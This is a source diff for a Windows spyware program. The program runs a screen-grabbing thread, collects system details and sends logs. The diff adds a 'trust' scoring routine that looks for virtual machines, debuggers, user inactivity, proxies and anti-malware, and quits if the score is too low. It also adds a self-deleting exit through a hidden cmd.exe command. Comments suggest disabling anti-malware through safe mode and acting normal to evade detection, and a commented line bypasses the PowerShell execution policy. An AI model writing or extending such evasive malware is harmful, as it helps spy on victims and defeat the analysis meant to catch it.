@@ -1,4 +1,5 @@
 #include "common.h"
+#include "logo.h"
 
 //#include "lz4/lz4.h"
 //#include <Wbemidl.h>
@@ -26,32 +27,18 @@ int main()
 
     srand(RandSeed);
 
-    bool PatchedMe = false;
-
 #ifndef debug
 
 
-    POINT position1, position2;
     int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
 
     for (int j = 0; j <= Divider; j++) {
         Sleep(DividedSleep);
     }
 
-    GetCursorPos(&position1);
-    DWORD PatchCheck = GetTickCount();
-    
-    if ((int)(PatchCheck - Tick1) < Time - 5000) {
-        PatchedMe = true;
-    }
-
-    GetCursorPos(&position2);
-    if ((position1.x == position2.x) && (position1.y == position2.y)) {
-        exit(3);
-    }
-
     unsigned long ThreadId;
     CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
+
 
 #endif
 
@@ -61,6 +48,18 @@ int main()
     CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
 
     //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
+
+    AntiDBG DebugItem;
+    DebugItem.Initialize();
+    TrustItems Trust = DebugItem.TrustItem;
+    bool TrustTooLow = false;
+    if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
+        TrustTooLow = true;                                         
+    }
+    //add special security routines, example:
+    // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
+    // or
+    // if( classic sandbox parameters ){ act like a normal program to evade detection }
 
 Log:
 
@@ -124,6 +123,8 @@ Log:
     StartDate += std::to_string(SysTime.wSecond);
     StartDate += "_________\n";
 
+    log.LogItChar(MyLogo);
+    log.LogItChar("\n");
     log.LogItChar(StartDate);
 
 #ifdef debug
@@ -140,11 +141,44 @@ Log:
 
 #endif
 
-    if (PatchedMe) {
-        log.LogItChar("I was patched! Exiting... ;(");
-        exit(1);
+    if (FirstLog) {
+        if (Trust.IsResCheck)
+            log.LogItChar("Resolution ratio mismatch, trust decreased...");
+        if (Trust.IsInVM)
+            log.LogItChar("VM Guest specific files found, trust decreased...");
+        if (Trust.IsHostingAVM)
+            log.LogItChar("VM Host specific files found, trust increased...");
+        if (Trust.IsSmallHardDrive)
+            log.LogItChar("HardDrive is under the set minimum, trust decreased...");
+        if (Trust.IsSmallRAM)
+            log.LogItChar("RAM is under the set minimum, trust decreased...");
+        if (Trust.IsBeingDebugged)
+            log.LogItChar("Process is being debugged, trust decreased...");
+        if (Trust.HasOneCore)
+            log.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
+        if (Trust.HasMultipleMonitors)
+            log.LogItChar("Multiple monitor setup found, trust increased...");
+        if (Trust.HasBeenTimepatched)
+            log.LogItChar("Process has been timepatched, trust decreased...");
+        if (Trust.UserIsInactive)
+            log.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
+        if (Trust.HasActiveInternet)
+            log.LogItChar("Active internet connection found, trust increased...");
+        if (Trust.Proxied)
+            log.LogItChar("Proxy/Fake connection found, trust decreased...");
+        if (Trust.HasRunningAntiMalware)
+            log.LogItChar("Running Anti-Malware solution found, trust increased...");
+        if (Trust.HasMoreThan20Apps)
+            log.LogItChar("More than 20 apps installed, trust increased...");
+        if (Trust.ExtUserActivity)
+            log.LogItChar("No user input in the past 15s, trust decreased...");
     }
 
+    if (TrustTooLow) {
+        log.LogItChar("Trust factor too low, quitting...");
+        log.SendLog();
+        FinalExit();                                                                              //could just act normal instead of autodeleting, which is sus
+    }
 
     DWORD Size = MAX_LENGTH+1;
 
@@ -218,7 +252,6 @@ Log:
     }
 
     int x1, y1, x2, y2, w, h, mo, mb;
-
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
     y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
     x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
@@ -227,94 +260,55 @@ Log:
     mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
     w = x2 - x1;
     h = y2 - y1;
-
-   
-    double Ratios[6] = {4/3,16/9,21/9,32/9,16/10,5/4}; //check for monitor ratio (got this idea once i noticed heigth on my host and guest dont match, so if started in a not fullscreen VM the aspect ratio will be off)
     double Ratioed = (double)w / h;
-    bool RatioMatch = false;
-    for (int q = 0; q < 6; q++) {
-        if (Ratioed == Ratios[q]) {
-            RatioMatch = true;
-        }
-    }
-#ifndef debug
-    if (!RatioMatch) {
-        log.LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....");
-        exit(1);
-    }
-#endif
     std::string Width = std::to_string(w);
-
     std::string Height = std::to_string(h);
-
     std::string WindowsVersion = "Unknown";
-
     std::string Monitors = std::to_string(mo);
-    
     std::string MouseButtons = std::to_string(mb);
-
     std::string BootMode = "Yes";
 
     if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
         BootMode = "No";
     }
-
     std::string SlowMachine = "No";
-
     if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
         SlowMachine = "Yes";
     }
-
     std::string MiddleEast = "No";
     if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
         MiddleEast = "Yes";
     }
-
     if (IsWindows7OrGreater())
     {
         std::string WindowsVersion = "Seven";
     }
-
     if (IsWindows7SP1OrGreater())
     {
         std::string WindowsVersion = "Seven SP1";
     }
-
     if (IsWindows8OrGreater())
     {
         std::string WindowsVersion = "Eight";
     }
-
     if (IsWindows8Point1OrGreater())
     {
         std::string WindowsVersion = "Eight.one";
     }
-
     if (IsWindows10OrGreater())
     {
         std::string WindowsVersion = "Ten";
     }
-
     if (IsWindowsServer())
     {
         std::string WindowsVersion = "Server";
     }
 
-
     SYSTEM_INFO siSysInfo;
     GetSystemInfo(&siSysInfo);
-
     MEMORYSTATUSEX RAMStatus;
     RAMStatus.dwLength = sizeof(RAMStatus);
     GlobalMemoryStatusEx(&RAMStatus);
-
-#ifndef debug
-    if (siSysInfo.dwNumberOfProcessors < RequiredCores || (RAMStatus.ullTotalPhys / 1024) / 1024 < RequiredRam) {
-        log.LogItChar("PC Specs dont match the requirements: probably a VM... exiting....");
-        exit(1);
-    }
-#endif
-
     std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
     std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
     std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
@@ -795,6 +789,22 @@ std::string GetCpuInfo()
     return cpu;
 }
 
+bool fexists(std::string filename) {
+    DWORD dwAttrib = GetFileAttributes(filename.c_str());
+
+    if(dwAttrib != INVALID_FILE_ATTRIBUTES)
+        return true;
+}
+
+void FinalExit() {
+    char PathToSelf[MAX_PATH];
+    GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
+    std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
+    Command += PathToSelf;
+    Command += "\"";
+    ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+    exit(0);
+}
 
 
 #pragma warning( pop )
